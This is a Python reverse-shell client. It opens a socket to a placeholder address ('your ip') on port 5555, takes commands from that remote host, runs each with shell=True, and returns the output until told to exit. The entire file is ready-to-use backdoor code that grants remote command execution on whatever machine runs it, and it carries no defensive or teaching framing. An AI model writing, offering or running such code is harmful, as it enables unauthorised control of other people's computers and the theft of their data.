import socket
import subprocess

def start_client():
    host = 'your ip'
    port = 5555  # Update with the correct port

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break

        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = f"Output:\n{result.stdout}\nError (if any):\n{result.stderr}\nExit Code: {result.returncode}"
            client_socket.send(output.encode())
        except Exception as e:
            error_message = f"Error executing command: {str(e)}"
            client_socket.send(error_message.encode())

    client_socket.close()

if __name__ == "__main__":
    start_client()
